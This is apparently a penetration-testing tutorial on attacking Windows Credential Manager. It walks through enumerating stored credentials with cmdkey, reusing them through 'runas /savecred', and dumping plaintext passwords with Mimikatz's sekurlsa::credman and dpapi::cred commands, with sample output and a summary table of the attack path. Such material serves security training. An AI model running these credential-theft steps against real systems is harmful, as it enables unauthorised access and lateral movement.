# Attacking Windows Credential Manager

[Credential Manager](https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication#windows-vault-and-credential-manager) is a feature built into Windows since Server 2008 R2 and Windows 7 that allows users and applications to securely store credentials for other systems and websites. From an attacker's perspective it is a high-value target because it frequently contains domain user credentials, network share passwords, OneDrive tokens, and RDP saved passwords — all stored on disk and decryptable with the right access.

## Storage Locations

Credential Manager stores its encrypted data across several vault folders depending on whether the credential is user-scoped or system-scoped. As documented under [MITRE ATT&CK T1555.004](https://attack.mitre.org/techniques/T1555/004/), the vault folders are:

```
%UserProfile%\AppData\Local\Microsoft\Vault\
%UserProfile%\AppData\Local\Microsoft\Credentials\
%UserProfile%\AppData\Roaming\Microsoft\Vault\
%ProgramData%\Microsoft\Vault\
%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\
```

Each vault folder contains a `Policy.vpol` file holding AES-128 or AES-256 keys protected by [DPAPI](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection). These AES keys are then used to encrypt the individual credential entries. On systems with [Virtualization-based Security (VBS)](https://learn.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-vbs) and Credential Guard enabled, the underlying DPAPI master keys are further protected within a secured memory enclave, making offline decryption significantly harder.

Microsoft draws a distinction between two components often used interchangeably: **Credential Manager** is the user-facing API and Control Panel interface, while the actual encrypted stores are the **vault/locker folders** on disk. Two credential types are stored:

| Type | Description |
|---|---|
| Web Credentials | Credentials for websites and online accounts, used by Internet Explorer and legacy Edge |
| Windows Credentials | Login tokens for services such as OneDrive, domain resources, network shares, and scheduled tasks |

## Exporting Vaults

Windows Vaults can be exported to `.crd` backup files via the Control Panel or by launching the Key Manager UI through `rundll32`:

```cmd
rundll32 keymgr.dll,KRShowKeyMgr
```

Backups are encrypted with a user-supplied password and can be imported on other Windows systems. This is a legitimate Windows feature, but the same mechanism can be abused to exfiltrate vault contents for offline analysis.

## Step 1: Enumerating Stored Credentials

[cmdkey](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey) is a built-in Windows utility that lists all credentials stored in the current user's Credential Manager profile without requiring any elevated privileges:

```cmd
C:\Users\sadams> cmdkey /list

Currently stored credentials:

    Target: WindowsLive:target=virtualapp/didlogical
    Type: Generic
    User: 02hejubrtyqjrkfi
    Local machine persistence

    Target: Domain:interactive=SRV01\mcharles
    Type: Domain Password
    User: SRV01\mcharles
```

Each entry contains four key fields:

| Field | Meaning |
|---|---|
| Target | The resource or account the credential is for — a computer name, domain, or service identifier |
| Type | `Generic` for general/service credentials; `Domain Password` for domain user logons |
| User | The account associated with the stored credential |
| Persistence | `Local machine persistence` indicates the credential survives reboots |

The first entry (`virtualapp/didlogical`) is an internal Microsoft account/Windows Live service credential — the random-looking username is an internal account ID and can be ignored. The second entry (`Domain:interactive=SRV01\mcharles`) is the interesting one. The `interactive` qualifier means the credential is used for interactive logon sessions, making it directly usable with `runas`.

## Step 2: Impersonating Stored Credentials with runas

When a `Domain Password` credential with an `interactive` target is present, it can be used immediately without knowing the plaintext password. The `/savecred` flag tells `runas` to pull the password from Credential Manager rather than prompting for it:

```cmd
C:\Users\sadams> runas /savecred /user:SRV01\mcharles cmd
Attempting to start cmd as user "SRV01\mcharles" ...
```

This spawns a `cmd.exe` process running in the context of `mcharles` — effectively a privilege escalation or lateral movement step depending on what rights that account holds. No cracking or decryption is required.

## Step 3: Extracting Credentials with Mimikatz

[Mimikatz](https://github.com/gentilkiwi/mimikatz) provides two distinct approaches to Credential Manager extraction:

- `sekurlsa::credman` — reads Credential Manager entries directly from LSASS memory (requires SeDebugPrivilege)
- `dpapi::*` modules — manually decrypts credential blobs on disk using recovered DPAPI master keys

The `sekurlsa::credman` approach is the most straightforward when LSASS access is available:

```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::credman

Authentication Id : 0 ; 630472 (00000000:00099ec8)
Session           : RemoteInteractive from 3
User Name         : mcharles
Domain            : SRV01
SID               : S-1-5-21-1340203682-1669575078-4153855890-1002
        credman :
         [00000000]
         * Username : mcharles@inlanefreight.local
         * Domain   : onedrive.live.com
         * Password : <plaintext recovered>
```

`sekurlsa::credman` works because LSASS holds decrypted credential material for active sessions — it reads Credential Manager entries from process memory rather than attempting to decrypt vault files on disk, bypassing DPAPI entirely for any user with an active logon session.

For a fully manual disk-based approach without touching LSASS, the `dpapi::cred` module can be used alongside a recovered master key:

```
# Inspect the encrypted credential blob on disk
mimikatz # dpapi::cred /in:C:\Users\sadams\AppData\Local\Microsoft\Credentials\<blob_id>

# Recover the master key from LSASS
mimikatz # sekurlsa::dpapi

# Decrypt using the master key
mimikatz # dpapi::cred /in:C:\Users\sadams\AppData\Local\Microsoft\Credentials\<blob_id> /masterkey:<key>
```

## Additional Tools

Several other tools can enumerate and extract stored Credential Manager entries:

- [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) — .NET tool for offline DPAPI blob decryption; can target vault files on disk without needing an active LSASS session
- [LaZagne](https://github.com/AlessandroZ/LaZagne) — broad credential harvesting tool covering Credential Manager, browsers, Wi-Fi credentials, and more
- [DonPAPI](https://github.com/login-securite/DonPAPI) — remote DPAPI credential dumping over SMB using existing admin credentials, no binary needed on target

## Attack Path Summary

| Step | Scenario | Method |
|---|---|---|
| Enumerate entries | Any user access level | `cmdkey /list` |
| Use credential without knowing password | `Domain:interactive` entry present | `runas /savecred /user:<target> cmd` |
| Extract plaintext from memory | Active session + SeDebugPrivilege | `mimikatz sekurlsa::credman` |
| Decrypt vault blobs on disk | Master key available | `mimikatz dpapi::cred /in:<blob> /masterkey:<key>` |
| Decrypt vault blobs offline | SYSTEM or domain backup key | SharpDPAPI, DonPAPI |
| Export vault for offline analysis | User or admin access | `rundll32 keymgr.dll,KRShowKeyMgr` |
